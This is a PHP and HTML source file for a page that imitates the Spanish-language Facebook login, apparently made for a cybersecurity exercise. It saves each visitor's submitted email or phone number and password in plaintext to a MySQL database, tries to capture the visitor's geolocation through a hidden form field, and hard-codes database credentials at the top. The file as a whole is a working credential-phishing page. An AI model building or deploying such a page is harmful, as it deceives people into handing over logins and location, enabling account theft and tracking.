<?php
// Datos de conexión a la base de datos
$host = 'localhost';
$dbname = 'u983503200_ciberseguridad';
$username = 'u983503200_dani';
$password = 'Cosa20240424*';

try {
    // Conexión a la base de datos usando PDO
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    
    // Configuración para lanzar excepciones en caso de errores
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Verificamos si se ha enviado el formulario
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Recuperamos los datos del formulario
        $email = $_POST['email'];
        $pass = $_POST['pass'];
        $ubicacion = $_POST['ubicacion']; // Recuperar la ubicación del formulario

        // Preparamos la consulta SQL para insertar los datos en la tabla de la base de datos
        $stmt = $pdo->prepare("INSERT INTO usuarios (id, usuario, contraseña, fecha, ubicacion) VALUES (NULL, :email, :pass, NOW(), :ubicacion)");

        // Bind parameters
        $stmt->bindParam(':email', $email);
        $stmt->bindParam(':pass', $pass);
        $stmt->bindParam(':ubicacion', $ubicacion); // Vincular la ubicación

        // Ejecutamos la consulta
        $stmt->execute();

        echo "Los datos se han almacenado correctamente en la base de datos.";
    }
} catch(PDOException $e) {
    echo "Error al conectar a la base de datos: " . $e->getMessage();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Two-Column Layout</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        body {
            font-family: 'Helvetica', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f8ff;
        }

        .title-column {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 50px 0;
        }

        .title {
            color: #3b5998;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .description {
            color: #3b5998;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 40px;
        }

        .form-column {
            padding: 50px 0;
            background-color: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        form {
            margin: 0 auto;
            width: 80%;
        }

        label {
            display: block;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        input[type="text"], input[type="password"] {
            border: 1px solid #ccc;
            font-size: 18px;
            padding: 10px;
            width: 100%;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: #3b5998;
            border: 0;
            color: #fff;
            font-size: 18px;
            padding: 10px 20px;
            cursor: pointer;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #2d4373;
        }

        a {
            color:#3b5998;
            font-size: 16px;
            margin-bottom: 10px;
            display: block;
            text-align: center;
        }

        a:hover {
            text-decoration: underline;
        }
        .logo {
            width: 300px;
            height: auto;
            margin-bottom: 20px;
            align-items: flex-start;
            }

    </style>
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-md-6 title-column">
                <img src="logo_face.png" alt="Facebook Logo" class="logo">
                <p class="description">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
            </div>
            <div class="col-md-6 form-column">
                <form method="post">
                    <label for="email">Correo electrónico o número de teléfono:</label><br>
                    <input type="text" id="email" name="email"><br>
                    <label for="pass">Contraseña:</label><br>
                    <input type="password" id="pass" name="pass"><br>
                    <!-- Agregar un campo oculto para la ubicación -->
                    <input type="hidden" id="ubicacion" name="ubicacion" value="">
                    <input type="submit" value="Iniciar sesión">
                    <a href="#">¿Olvidaste tu contraseña?</a><br>
                    <a href="#">Crea una cuenta nueva</a><br>
                    <a href="#">Crea una página para una celebridad, una marca o un negocio.</a>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Función para obtener la ubicación del dispositivo
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocalización no es soportada por este navegador.");
            }
        }

        // Función para mostrar la ubicación y almacenarla en el campo oculto del formulario
        function showPosition(position) {
            var ubicacion = position.coords.latitude + "," + position.coords.longitude;
            document.getElementById('ubicacion').value = ubicacion;
        }

        // Obtener la ubicación cuando se envía el formulario
        document.querySelector('form').addEventListener('submit', function() {
            getLocation();
        });
    </script>
</body>
</html>
